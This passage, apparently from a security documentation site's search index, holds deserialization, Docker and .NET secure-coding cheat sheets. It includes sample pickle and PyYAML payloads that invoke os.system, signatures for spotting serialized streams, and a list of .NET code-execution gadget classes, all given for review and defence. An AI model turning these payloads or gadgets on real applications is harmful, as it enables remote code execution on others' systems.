unsafe Java object deserialization. Java De-serialization toolkits Java de-serialization tool .Net payload generator Burp Suite extension Java secure deserialization library Serianalyzer is a static bytecode analyzer for deserialization Payload generator Android Java Deserialization Vulnerability Tester Burp Suite Extension JavaSerialKiller Java Deserialization Scanner Burp-ysoserial SuperSerial SuperSerial-Active References \u00b6 Java-Deserialization-Cheat-Sheet Deserialization of untrusted data Java Deserialization Attacks - German OWASP Day 2016 AppSecCali 2015 - Marshalling Pickles FoxGlove Security - Vulnerability Announcement Java deserialization cheat sheet aimed at pen testers A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. Java De-serialization toolkits Java de-serialization tool Burp Suite extension Java secure deserialization library Serianalyzer is a static bytecode analyzer for deserialization Payload generator Android Java Deserialization Vulnerability Tester Burp Suite Extension JavaSerialKiller Java Deserialization Scanner Burp-ysoserial SuperSerial SuperSerial-Active .Net Alvaro Mu\u00f1oz: .NET Serialization: Detecting and defending vulnerable endpoints James Forshaw - Black Hat USA 2012 - Are You My Type? Breaking .net Sandboxes Through Serialization Jonathan Birch BlueHat v17 - Dangerous Contents - Securing .Net Deserialization Alvaro Mu\u00f1oz & Oleksandr Mirosh - Friday the 13th: Attacking JSON - AppSecUSA 2017","title":"Deserialization"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#deserialization-cheat-sheet","text":"","title":"Deserialization Cheat Sheet"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#introduction","text":"This article is focused on providing clear, actionable guidance for safely deserializing untrusted data in your applications.","title":"Introduction"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#what-is-deserialization","text":"Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML. However, many programming languages offer a native capability for serializing objects. These native formats usually offer more features than JSON or XML, including customizability of the serialization process. Unfortunately, the features of these native deserialization mechanisms can be repurposed for malicious effect when operating on untrusted data. Attacks against deserializers have been found to allow denial-of-service, access control, and remote code execution (RCE) attacks.","title":"What is Deserialization"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#guidance-on-deserializing-objects-safely","text":"The following language-specific guidance attempts to enumerate safe methodologies for deserializing data that can't be trusted.","title":"Guidance on Deserializing Objects Safely"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#php","text":"","title":"PHP"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#whitebox-review","text":"Check the use of unserialize() function and review how the external parameters are accepted. Use a safe, standard data interchange format such as JSON (via json_decode() and json_encode() ) if you need to pass serialized data to the user.","title":"WhiteBox Review"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#python","text":"","title":"Python"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#blackbox-review","text":"If the traffic data contains the symbol dot . at the end, it's very likely that the data was sent in serialization.","title":"BlackBox Review"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#whitebox-review_1","text":"The following API in Python will be vulnerable to serialization attack. Search code for the pattern below. The uses of pickle/c_pickle/_pickle with load/loads : import pickle data = \"\"\" cos.system(S'dir')tR. \"\"\" pickle . loads ( data ) Uses of PyYAML with load : import yaml document = \"!!python/object/apply:os.system ['ipconfig']\" print ( yaml . load ( document )) Uses of jsonpickle with encode or store methods.","title":"WhiteBox Review"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#java","text":"The following techniques are all good for preventing attacks against deserialization against Java's Serializable format . Implementation advices: In your code, override the ObjectInputStream#resolveClass() method to prevent arbitrary classes from being deserialized. This safe behavior can be wrapped in a library like SerialKiller . Use a safe replacement for the generic readObject() method as seen here. Note that this addresses \" billion laughs \" type attacks by checking input length and number of objects deserialized.","title":"Java"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#whitebox-review_2","text":"Be aware of the following Java API uses for potential serialization vulnerability. 1. XMLdecoder with external user defined parameters 2. XStream with fromXML method (xstream version <= v1.46 is vulnerable to the serialization issue) 3. ObjectInputStream with readObject 4. Uses of readObject , readObjectNodData , readResolve or readExternal 5. ObjectInputStream.readUnshared 6. Serializable","title":"WhiteBox Review"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#blackbox-review_1","text":"If the captured traffic data include the following patterns may suggest that the data was sent in Java serialization streams AC ED 00 05 in Hex rO0 in Base64 Content-type header of an HTTP response set to application/x-java-serialized-object","title":"BlackBox Review"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#prevent-data-leakage-and-trusted-field-clobbering","text":"If there are data members of an object that should never be controlled by end users during deserialization or exposed to users during serialization, they should be declared as the transient keyword (section Protecting Sensitive Information ). For a class that defined as Serializable, the sensitive information variable should be declared as private transient . For example, the class myAccount, the variable 'profit' and 'margin' were declared as transient to avoid to be serialized: public class myAccount implements Serializable { private transient double profit ; // declared transient private transient double margin ; // declared transient ....","title":"Prevent Data Leakage and Trusted Field Clobbering"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#prevent-deserialization-of-domain-objects","text":"Some of your application objects may be forced to implement Serializable due to their hierarchy. To guarantee that your application objects can't be deserialized, a readObject() method should be declared (with a final modifier) which always throws an exception: private final void readObject ( ObjectInputStream in ) throws java . io . IOException { throw new java . io . IOException ( \"Cannot be deserialized\" ); }","title":"Prevent Deserialization of Domain Objects"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#harden-your-own-javaioobjectinputstream","text":"The java.io.ObjectInputStream class is used to deserialize objects. It's possible to harden its behavior by subclassing it. This is the best solution if: You can change the code that does the deserialization You know what classes you expect to deserialize The general idea is to override ObjectInputStream.html#resolveClass() in order to restrict which classes are allowed to be deserialized. Because this call happens before a readObject() is called, you can be sure that no deserialization activity will occur unless the type is one that you wish to allow. A simple example of this shown here, where the the LookAheadObjectInputStream class is guaranteed not to deserialize any other type besides the Bicycle class: public class LookAheadObjectInputStream extends ObjectInputStream { public LookAheadObjectInputStream ( InputStream inputStream ) throws IOException { super ( inputStream ); } /** * Only deserialize instances of our expected Bicycle class */ @Override protected Class <?> resolveClass ( ObjectStreamClass desc ) throws IOException , ClassNotFoundException { if ( ! desc . getName (). equals ( Bicycle . class . getName ())) { throw new InvalidClassException ( \"Unauthorized deserialization attempt\" , desc . getName ()); } return super . resolveClass ( desc ); } } More complete implementations of this approach have been proposed by various community members: NibbleSec - a library that allows whitelisting and blacklisting of classes that are allowed to be deserialized IBM - the seminal protection, written years before the most devastating exploitation scenarios were envisioned. Apache Commons IO classes","title":"Harden Your Own java.io.ObjectInputStream"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#harden-all-javaioobjectinputstream-usage-with-an-agent","text":"As mentioned above, the java.io.ObjectInputStream class is used to deserialize objects. It's possible to harden its behavior by subclassing it. However, if you don't own the code or can't wait for a patch, using an agent to weave in hardening to java.io.ObjectInputStream is the best solution. Globally changing ObjectInputStream is only safe for blacklisting known malicious types, because it's not possible to know for all applications what the expected classes to be deserialized are. Fortunately, there are very few classes needed in the blacklist to be safe from all the known attack vectors, today. It's inevitable that more \"gadget\" classes will be discovered that can be abused. However, there is an incredible amount of vulnerable software exposed today, in need of a fix. In some cases, \"fixing\" the vulnerability may involve re-architecting messaging systems and breaking backwards compatibility as developers move towards not accepting serialized objects. To enable these agents, simply add a new JVM parameter: -javaagent:name-of-agent.jar Agents taking this approach have been released by various community members: rO0 by Contrast Security A similar, but less scalable approach would be to manually patch and bootstrap your JVM's ObjectInputStream. Guidance on this approach is available here .","title":"Harden All java.io.ObjectInputStream Usage with an Agent"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp","text":"","title":".Net CSharp"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#whitebox-review_3","text":"Search the source code for the following terms: TypeNameHandling JavaScriptTypeResolver Look for any serializers where the type is set by a user controlled variable.","title":"WhiteBox Review"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#blackbox-review_2","text":"Search for the following base64 encoded content that starts with: AAEAAAD///// Search for content with the following text: TypeObject $type:","title":"BlackBox Review"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#general-precautions","text":"Don't allow the datastream to define the type of object that the stream will be deserialized to. You can prevent this by for example using the DataContractSerializer or XmlSerializer if at all possible. Where JSON.Net is being used make sure the TypeNameHandling is only set to None . TypeNameHandling = TypeNameHandling . None If JavaScriptSerializer is to be used then do not use it with a JavaScriptTypeResolver . If you must deserialise data streams that define their own type, then restrict the types that are allowed to be deserialized. One should be aware that this is still risky as many native .Net types potentially dangerous in themselves. e.g. System . IO . FileInfo FileInfo objects that reference files actually on the server can when deserialized, change the properties of those files e.g. to read-only, creating a potential denial of service attack. Even if you have limited the types that can be deserialised remember that some types have properties that are risky. System.ComponentModel.DataAnnotations.ValidationException , for example has a property Value of type Object . if this type is the type allowed for deserialization then an attacker can set the Value property to any object type they choose. Attackers should be prevented from steering the type that will be instantiated. If this is possible then even DataContractSerializer or XmlSerializer can be subverted e.g. // Action below is dangerous if the attacker can change the data in the database var typename = GetTransactionTypeFromDatabase (); var serializer = new DataContractJsonSerializer ( Type . GetType ( typename )); var obj = serializer . ReadObject ( ms ); Execution can occur within certain .Net types during deserialization. Creating a control such as the one shown below is ineffective. var suspectObject = myBinaryFormatter . Deserialize ( untrustedData ); //Check below is too late! Execution may have already occurred. if ( suspectObject is SomeDangerousObjectType ) { //generate warnings and dispose of suspectObject } For BinaryFormatter and JSON.Net it is possible to create a safer form of white list control using a custom SerializationBinder . Try to keep up-to-date on known .Net insecure deserialization gadgets and pay special attention where such types can be created by your deserialization processes. A deserializer can only instantiate types that it knows about . Try to keep any code that might create potential gadgets separate from any code that has internet connectivity. As an example System.Windows.Data.ObjectDataProvider used in WPF applications is a known gadget that allows arbitrary method invocation. It would be risky to have this a reference to this assembly in a REST service project that deserializes untrusted data.","title":"General Precautions"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#known-net-rce-gadgets","text":"System.Configuration.Install.AssemblyInstaller System.Activities.Presentation.WorkflowDesigner System.Windows.ResourceDictionary System.Windows.Data.ObjectDataProvider System.Windows.Forms.BindingSource Microsoft.Exchange.Management.SystemManager.WinForms.ExchangeSettingsProvider System.Data.DataViewManager, System.Xml.XmlDocument/XmlDataDocument System.Management.Automation.PSObject","title":"Known .NET RCE Gadgets"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#language-agnostic-methods-for-deserializing-safely","text":"","title":"Language-Agnostic Methods for Deserializing Safely"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#using-alternative-data-formats","text":"A great reduction of risk is achieved by avoiding native (de)serialization formats. By switching to a pure data format like JSON or XML, you lessen the chance of custom deserialization logic being repurposed towards malicious ends. Many applications rely on a data-transfer object pattern that involves creating a separate domain of objects for the explicit purpose data transfer. Of course, it's still possible that the application will make security mistakes after a pure data object is parsed.","title":"Using Alternative Data Formats"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#only-deserialize-signed-data","text":"If the application knows before deserialization which messages will need to be processed, they could sign them as part of the serialization process. The application could then to choose not to deserialize any message which didn't have an authenticated signature.","title":"Only Deserialize Signed Data"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#mitigation-toolslibraries","text":"Java secure deserialization library SWAT (Serial Whitelist Application Trainer) NotSoSerial","title":"Mitigation Tools/Libraries"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#detection-tools","text":"Java deserialization cheat sheet aimed at pen testers A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. Java De-serialization toolkits Java de-serialization tool .Net payload generator Burp Suite extension Java secure deserialization library Serianalyzer is a static bytecode analyzer for deserialization Payload generator Android Java Deserialization Vulnerability Tester Burp Suite Extension JavaSerialKiller Java Deserialization Scanner Burp-ysoserial SuperSerial SuperSerial-Active","title":"Detection Tools"},{"location":"cheatsheets/Deserialization_Cheat_Sheet.html#references","text":"Java-Deserialization-Cheat-Sheet Deserialization of untrusted data Java Deserialization Attacks - German OWASP Day 2016 AppSecCali 2015 - Marshalling Pickles FoxGlove Security - Vulnerability Announcement Java deserialization cheat sheet aimed at pen testers A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. Java De-serialization toolkits Java de-serialization tool Burp Suite extension Java secure deserialization library Serianalyzer is a static bytecode analyzer for deserialization Payload generator Android Java Deserialization Vulnerability Tester Burp Suite Extension JavaSerialKiller Java Deserialization Scanner Burp-ysoserial SuperSerial SuperSerial-Active .Net Alvaro Mu\u00f1oz: .NET Serialization: Detecting and defending vulnerable endpoints James Forshaw - Black Hat USA 2012 - Are You My Type? Breaking .net Sandboxes Through Serialization Jonathan Birch BlueHat v17 - Dangerous Contents - Securing .Net Deserialization Alvaro Mu\u00f1oz & Oleksandr Mirosh - Friday the 13th: Attacking JSON - AppSecUSA 2017","title":"References"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html","text":"Docker Security Cheat Sheet \u00b6 Introduction \u00b6 Docker is the most popular containerization technology. Upon proper use, it can increase the level of security (in comparison to running applications directly on the host). On the other hand, some misconfigurations can lead to downgrade the level of security or even introduce new vulnerabilities. The aim of this cheat sheet is to provide an easy to use list of common security mistakes and good practices that will help you secure your Docker containers. Rules \u00b6 RULE #0 - Keep Host and Docker up to date \u00b6 To prevent from known, container escapes vulnerabilities, which typically end in escalating to root/administrator privileges, patching Docker Engine and Docker Machine is crucial. In addition, containers (unlike in virtual machines) share the kernel with the host, therefore kernel exploits executed inside the container will directly hit host kernel. For example, kernel privilege escalation exploit ( like Dirty COW ) executed inside a well-insulated container will result in root access in a host. RULE #1 - Do not expose the Docker daemon socket (even to the containers) \u00b6 Docker socket /var/run/docker.sock is the UNIX socket that Docker is listening to. This is the primary entry point for the Docker API. The owner of this socket is root. Giving someone access to it is equivalent to giving unrestricted root access to your host. Do not enable tcp Docker daemon socket. If you are running docker daemon with -H tcp://0.0.0.0:XXX or similar you are exposing un-encrypted and un-authenticated direct access to the Docker daemon. If you really, really have to do this, you should secure it. Check how to do this following Docker official documentation . Do not expose /var/run/docker.sock to other containers . If you are running your docker image with -v /var/run/docker.sock://var/run/docker.sock or similar, you should change it. Remember that mounting the socket read-only is not a solution but only makes it harder to exploit. Equivalent in the docker-compose file is something like this: volumes : - \"/var/run/docker.sock:/var/run/docker.sock\" RULE #2 - Set a user \u00b6 Configuring the container to use an unprivileged user is the best way to prevent privilege escalation attacks. This can be accomplished in three different ways as follows: During runtime using -u option of docker run command e.g.: docker run -u 4000 alpine During build time. Simple add user in Dockerfile and use it. For example: FROM alpine RUN groupadd -r myuser && useradd -r -g myuser myuser <HERE DO WHAT YOU HAVE TO DO AS A ROOT USER LIKE INSTALLING PACKAGES ETC.> USER myuser Enable user namespace support ( --userns-remap=default ) in Docker daemon More information about this topic can be found at Docker official documentation In kubernetes, this can be configured in Security Context using runAsNonRoot field e.g.: kind : ... apiVersion : ... metadata : name : ... spec : ... containers : - name : ... image : .... securityContext : ... runAsNonRoot : true ... As a Kubernetes cluster administrator, you can configure it using Pod Security Policies . RULE #3 - Limit capabilities (Grant only specific capabilities, needed by a container) \u00b6 Linux kernel capabilities are a set of privileges that can be used by privileged. Docker, by default, runs with only a subset of capabilities. You can change it and drop some capabilities (using --cap-drop ) to harden your docker containers, or add some capabilities (using --cap-add ) if needed. Remember not to run containers with the --privileged flag - this will add ALL Linux kernel capabilities to the container. The most secure setup is to drop all capabilities --cap-drop all and then add only required ones. For example: docker run --cap-drop all --cap-add CHOWN alpine And remember: Do not run containers with the --privileged flag!!! In kubernetes this can be configured in Security Context using capabilities field e.g.: kind : ... apiVersion : ... metadata : name : ... spec : ... containers : - name : ... image : .... securityContext : ... capabilities : drop : - all add : - CHOWN ... As a Kubernetes cluster administrator, you can configure it using Pod Security Policies . RULE #4 - Add \u2013no-new-privileges flag \u00b6 Always run your docker images with --security-opt=no-new-privileges in order to prevent escalate privileges using setuid or setgid binaries. In kubernetes, this can be configured in Security Context using allowPrivilegeEscalation field e.g.: kind : ... apiVersion : ... metadata : name : ... spec : ... containers : - name : ... image : .... securityContext : ... allowPrivilegeEscalation : false ... As a Kubernetes cluster administrator, you can refer to Kubernetes documentation to configure it using Pod Security Policies . RULE #5 - Disable inter-container communication (--icc=false) \u00b6 By default inter-container communication (icc) is enabled - it means that all containers can talk with each other (using docker0 bridged network ). This can be disabled by running docker daemon with --icc=false flag. If icc is disabled (icc=false) it is required to tell which containers can communicate using --link=CONTAINER_NAME_or_ID:ALIAS option. See more in Docker documentation - container communication In Kubernetes Network Policies can be used for it. RULE #6 - Use Linux Security Module (seccomp, AppArmor, or SELinux) \u00b6 First of all, do not disable default security profile! Consider using security profile like seccomp or AppArmor . Instructions how to do this inside Kubernetes can be found at Security Context documentation and in Kubernetes API documentation RULE #7 - Limit resources (memory, CPU, file descriptors, processes, restarts) \u00b6 The best way to avoid DoS attacks is by limiting resources. You can limit memory , CPU , maximum number of restarts ( --restart=on-failure:<number_of_restarts> ), maximum number of file descriptors ( --ulimit nofile=<number> ) and maximum number of processes ( --ulimit nproc=<number> ). Check documentation for more details about ulimits You can also do this inside Kubernetes: Assign Memory Resources to Containers and Pods , Assign CPU Resources to Containers and Pods and Assign Extended Resources to a Container RULE #8 - Set filesystem and volumes to read-only \u00b6 Run containers with a read-only filesystem using --read-only flag. For example: docker run --read-only alpine sh -c 'echo \"whatever\" > /tmp' If an application inside a container has to save something temporarily, combine --read-only flag with --tmpfs like this: docker run --read-only --tmpfs /tmp alpine sh -c 'echo \"whatever\" > /tmp/file' Equivalent in the docker-compose file will be: version : \"3\" services : alpine : image : alpine read_only : true Equivalent in kubernetes in Security Context will be: kind : ... apiVersion : ... metadata : name : ... spec : ... containers : - name : ... image : .... securityContext : ... readOnlyRootFilesystem : true ... In addition, if the volume is mounted only for reading mount them as a read-only It can be done by appending :ro to the -v like this: docker run -v volume-name:/path/in/container:ro alpine Or by using --mount option: docker run --mount source = volume-name,destination = /path/in/container,readonly alpine RULE #9 - Use static analysis tools \u00b6 To detect containers with known vulnerabilities - scan images using static analysis tools. Free Clair Trivy Commercial Snyk (open source and free option available) anchore (open source and free option available) Aqua Security's MicroScanner (free option available for rate-limited number of scans) JFrog XRay Qualys To detect misconfigurations in Kubernetes: kubeaudit kubesec.io kube-bench To detect misconfigurations in Docker: inspec.io dev-sec.io RULE #10 - Set the logging level to at least INFO \u00b6 By default, the Docker daemon is configured to have a base logging level of 'info', and if this is not the case: set the Docker daemon log level to 'info'. Rationale: Setting up an appropriate log level, configures the Docker daemon to log events that you would want to review later. A base log level of 'info' and above would capture all logs except the debug logs. Until and unless required, you should not run docker daemon at the 'debug' log level. To configure the log level in docker-compose: docker-compose --log-level info up Rule #11 - Lint the Dockerfile at build time \u00b6 Many issues can be prevented by following some best practices when writing the Dockerfile. Adding a security linter as a step in the the build pipeline can go a long way in avoiding further headaches. Some issues that are worth checking are: Ensure a USER directive is specified Ensure the base image version is pinned Ensure the OS packages versions are pinned Avoid the use of ADD in favor of COPY Avoid the use of apt/apk upgrade Avoid curl bashing in RUN directives References: Docker Baselines on DevSec Use the Docker command line Overview of docker-compose CLI Configuring Logging Drivers View logs for a container or service Dockerfile Security Best Practices Related Projects \u00b6 OWASP Docker Top 10","title":"Docker Security"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html#docker-security-cheat-sheet","text":"","title":"Docker Security Cheat Sheet"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html#introduction","text":"Docker is the most popular containerization technology. Upon proper use, it can increase the level of security (in comparison to running applications directly on the host). On the other hand, some misconfigurations can lead to downgrade the level of security or even introduce new vulnerabilities. The aim of this cheat sheet is to provide an easy to use list of common security mistakes and good practices that will help you secure your Docker containers.","title":"Introduction"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html#rules","text":"","title":"Rules"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html#rule-0-keep-host-and-docker-up-to-date","text":"To prevent from known, container escapes vulnerabilities, which typically end in escalating to root/administrator privileges, patching Docker Engine and Docker Machine is crucial. In addition, containers (unlike in virtual machines) share the kernel with the host, therefore kernel exploits executed inside the container will directly hit host kernel. For example, kernel privilege escalation exploit ( like Dirty COW ) executed inside a well-insulated container will result in root access in a host.","title":"RULE #0 - Keep Host and Docker up to date"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html#rule-1-do-not-expose-the-docker-daemon-socket-even-to-the-containers","text":"Docker socket /var/run/docker.sock is the UNIX socket that Docker is listening to. This is the primary entry point for the Docker API. The owner of this socket is root. Giving someone access to it is equivalent to giving unrestricted root access to your host. Do not enable tcp Docker daemon socket. If you are running docker daemon with -H tcp://0.0.0.0:XXX or similar you are exposing un-encrypted and un-authenticated direct access to the Docker daemon. If you really, really have to do this, you should secure it. Check how to do this following Docker official documentation . Do not expose /var/run/docker.sock to other containers . If you are running your docker image with -v /var/run/docker.sock://var/run/docker.sock or similar, you should change it. Remember that mounting the socket read-only is not a solution but only makes it harder to exploit. Equivalent in the docker-compose file is something like this: volumes : - \"/var/run/docker.sock:/var/run/docker.sock\"","title":"RULE #1 - Do not expose the Docker daemon socket (even to the containers)"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html#rule-2-set-a-user","text":"Configuring the container to use an unprivileged user is the best way to prevent privilege escalation attacks. This can be accomplished in three different ways as follows: During runtime using -u option of docker run command e.g.: docker run -u 4000 alpine During build time. Simple add user in Dockerfile and use it. For example: FROM alpine RUN groupadd -r myuser && useradd -r -g myuser myuser <HERE DO WHAT YOU HAVE TO DO AS A ROOT USER LIKE INSTALLING PACKAGES ETC.> USER myuser Enable user namespace support ( --userns-remap=default ) in Docker daemon More information about this topic can be found at Docker official documentation In kubernetes, this can be configured in Security Context using runAsNonRoot field e.g.: kind : ... apiVersion : ... metadata : name : ... spec : ... containers : - name : ... image : .... securityContext : ... runAsNonRoot : true ... As a Kubernetes cluster administrator, you can configure it using Pod Security Policies .","title":"RULE #2 - Set a user"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html#rule-3-limit-capabilities-grant-only-specific-capabilities-needed-by-a-container","text":"Linux kernel capabilities are a set of privileges that can be used by privileged. Docker, by default, runs with only a subset of capabilities. You can change it and drop some capabilities (using --cap-drop ) to harden your docker containers, or add some capabilities (using --cap-add ) if needed. Remember not to run containers with the --privileged flag - this will add ALL Linux kernel capabilities to the container. The most secure setup is to drop all capabilities --cap-drop all and then add only required ones. For example: docker run --cap-drop all --cap-add CHOWN alpine And remember: Do not run containers with the --privileged flag!!! In kubernetes this can be configured in Security Context using capabilities field e.g.: kind : ... apiVersion : ... metadata : name : ... spec : ... containers : - name : ... image : .... securityContext : ... capabilities : drop : - all add : - CHOWN ... As a Kubernetes cluster administrator, you can configure it using Pod Security Policies .","title":"RULE #3 - Limit capabilities (Grant only specific capabilities, needed by a container)"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html#rule-4-add-no-new-privileges-flag","text":"Always run your docker images with --security-opt=no-new-privileges in order to prevent escalate privileges using setuid or setgid binaries. In kubernetes, this can be configured in Security Context using allowPrivilegeEscalation field e.g.: kind : ... apiVersion : ... metadata : name : ... spec : ... containers : - name : ... image : .... securityContext : ... allowPrivilegeEscalation : false ... As a Kubernetes cluster administrator, you can refer to Kubernetes documentation to configure it using Pod Security Policies .","title":"RULE #4 - Add \u2013no-new-privileges flag"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html#rule-5-disable-inter-container-communication-iccfalse","text":"By default inter-container communication (icc) is enabled - it means that all containers can talk with each other (using docker0 bridged network ). This can be disabled by running docker daemon with --icc=false flag. If icc is disabled (icc=false) it is required to tell which containers can communicate using --link=CONTAINER_NAME_or_ID:ALIAS option. See more in Docker documentation - container communication In Kubernetes Network Policies can be used for it.","title":"RULE #5 - Disable inter-container communication (--icc=false)"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html#rule-6-use-linux-security-module-seccomp-apparmor-or-selinux","text":"First of all, do not disable default security profile! Consider using security profile like seccomp or AppArmor . Instructions how to do this inside Kubernetes can be found at Security Context documentation and in Kubernetes API documentation","title":"RULE #6 - Use Linux Security Module (seccomp, AppArmor, or SELinux)"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html#rule-7-limit-resources-memory-cpu-file-descriptors-processes-restarts","text":"The best way to avoid DoS attacks is by limiting resources. You can limit memory , CPU , maximum number of restarts ( --restart=on-failure:<number_of_restarts> ), maximum number of file descriptors ( --ulimit nofile=<number> ) and maximum number of processes ( --ulimit nproc=<number> ). Check documentation for more details about ulimits You can also do this inside Kubernetes: Assign Memory Resources to Containers and Pods , Assign CPU Resources to Containers and Pods and Assign Extended Resources to a Container","title":"RULE #7 - Limit resources (memory, CPU, file descriptors, processes, restarts)"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html#rule-8-set-filesystem-and-volumes-to-read-only","text":"Run containers with a read-only filesystem using --read-only flag. For example: docker run --read-only alpine sh -c 'echo \"whatever\" > /tmp' If an application inside a container has to save something temporarily, combine --read-only flag with --tmpfs like this: docker run --read-only --tmpfs /tmp alpine sh -c 'echo \"whatever\" > /tmp/file' Equivalent in the docker-compose file will be: version : \"3\" services : alpine : image : alpine read_only : true Equivalent in kubernetes in Security Context will be: kind : ... apiVersion : ... metadata : name : ... spec : ... containers : - name : ... image : .... securityContext : ... readOnlyRootFilesystem : true ... In addition, if the volume is mounted only for reading mount them as a read-only It can be done by appending :ro to the -v like this: docker run -v volume-name:/path/in/container:ro alpine Or by using --mount option: docker run --mount source = volume-name,destination = /path/in/container,readonly alpine","title":"RULE #8 - Set filesystem and volumes to read-only"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html#rule-9-use-static-analysis-tools","text":"To detect containers with known vulnerabilities - scan images using static analysis tools. Free Clair Trivy Commercial Snyk (open source and free option available) anchore (open source and free option available) Aqua Security's MicroScanner (free option available for rate-limited number of scans) JFrog XRay Qualys To detect misconfigurations in Kubernetes: kubeaudit kubesec.io kube-bench To detect misconfigurations in Docker: inspec.io dev-sec.io","title":"RULE #9 - Use static analysis tools"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html#rule-10-set-the-logging-level-to-at-least-info","text":"By default, the Docker daemon is configured to have a base logging level of 'info', and if this is not the case: set the Docker daemon log level to 'info'. Rationale: Setting up an appropriate log level, configures the Docker daemon to log events that you would want to review later. A base log level of 'info' and above would capture all logs except the debug logs. Until and unless required, you should not run docker daemon at the 'debug' log level. To configure the log level in docker-compose: docker-compose --log-level info up","title":"RULE #10 - Set the logging level to at least INFO"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html#rule-11-lint-the-dockerfile-at-build-time","text":"Many issues can be prevented by following some best practices when writing the Dockerfile. Adding a security linter as a step in the the build pipeline can go a long way in avoiding further headaches. Some issues that are worth checking are: Ensure a USER directive is specified Ensure the base image version is pinned Ensure the OS packages versions are pinned Avoid the use of ADD in favor of COPY Avoid the use of apt/apk upgrade Avoid curl bashing in RUN directives References: Docker Baselines on DevSec Use the Docker command line Overview of docker-compose CLI Configuring Logging Drivers View logs for a container or service Dockerfile Security Best Practices","title":"Rule #11 - Lint the Dockerfile at build time"},{"location":"cheatsheets/Docker_Security_Cheat_Sheet.html#related-projects","text":"OWASP Docker Top 10","title":"Related Projects"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html","text":"DotNet Security Cheat Sheet \u00b6 Introduction \u00b6 This page intends to provide quick basic .NET security tips for developers. The .NET Framework \u00b6 The .NET Framework is Microsoft's principal platform for enterprise development. It is the supporting API for ASP.NET, Windows Desktop applications, Windows Communication Foundation services, SharePoint, Visual Studio Tools for Office and other technologies. Updating the Framework \u00b6 The .NET Framework is kept up-to-date by Microsoft with the Windows Update service. Developers do not normally need to run separate updates to the Framework. Windows Update can be accessed at Windows Update or from the Windows Update program on a Windows computer. Individual frameworks can be kept up to date using NuGet . As Visual Studio prompts for updates, build it into your lifecycle. Remember that third-party libraries have to be updated separately and not all of them use NuGet. ELMAH for instance, requires a separate update effort. Security Announcements \u00b6 Receive security notifications by selecting the \"Watch\" button at the following repositories: .NET Core Security Announcements ASP.NET Core & Entity Framework Core Security Announcements .NET Framework Guidance \u00b6 The .NET Framework is the set of APIs that support an advanced type system, data, graphics, network, file handling and most of the rest of what is needed to write enterprise apps in the Microsoft ecosystem. It is a nearly ubiquitous library that is strongly named and versioned at the assembly level. Data Access \u00b6 Use Parameterized SQL commands for all data access, without exception. Do not use SqlCommand with a string parameter made up of a concatenated SQL String . Whitelist allowable values coming from the user. Use enums, TryParse or lookup values to assure that the data coming from the user is as expected. Enums are still vulnerable to unexpected values because .NET only validates a successful cast to the underlying data type, integer by default. Enum.IsDefined can validate whether the input value is valid within the list of defined constants. Apply the principle of least privilege when setting up the Database User in your database of choice. The database user should only be able to access items that make sense for the use case. Use of the Entity Framework is a very effective SQL injection prevention mechanism. Remember that building your own ad hoc queries in Entity Framework is just as susceptible to SQLi as a plain SQL query . When using SQL Server, prefer integrated authentication over SQL authentication . Use Always Encrypted where possible for sensitive data (SQL Server 2016 and SQL Azure), Encryption \u00b6 Never, ever write your own encryption. Use the Windows Data Protection API (DPAPI) for secure local storage of sensitive data. Use a strong hash algorithm. In .NET (both Framework and Core) the strongest hashing algorithm for general hashing requirements is System.Security.Cryptography.SHA512 . In the .NET framework the strongest algorithm for password hashing is PBKDF2, implemented as System.Security.Cryptography.Rfc2898DeriveBytes . In .NET Core the strongest algorithm for password hashing is PBKDF2, implemented as Microsoft.AspNetCore.Cryptography.KeyDerivation.Pbkdf2 which has several significant advantages over Rfc2898DeriveBytes . When using a hashing function to hash non-unique inputs such as passwords, use a salt value added to the original value before hashing. Make sure your application or protocol can easily support a future change of cryptographic algorithms. Use Nuget 